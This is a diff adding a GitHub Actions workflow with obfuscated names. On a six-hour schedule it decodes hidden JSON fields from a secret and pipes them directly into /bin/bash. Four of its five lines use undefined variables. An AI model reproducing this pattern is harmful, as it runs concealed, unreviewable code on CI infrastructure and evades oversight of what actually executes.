@@ -1,0 +1,21 @@
+name: chenjunnandiuu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '41 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenjunnandiuu
+        env:
+          aq4310: ${{ secrets.aq4310 }}
+        run: |
+          echo $aq4310 | jq -r .prtxx594 | /bin/bash
+          echo $tll695 | jq -r .cbf01507 | /bin/bash
+          echo $qr2 | jq -r .awql78619 | /bin/bash
+          echo $j52313 | jq -r .tkp4670 | /bin/bash
+          echo $jcpg4499 | jq -r .qpt5437 | /bin/bash
+
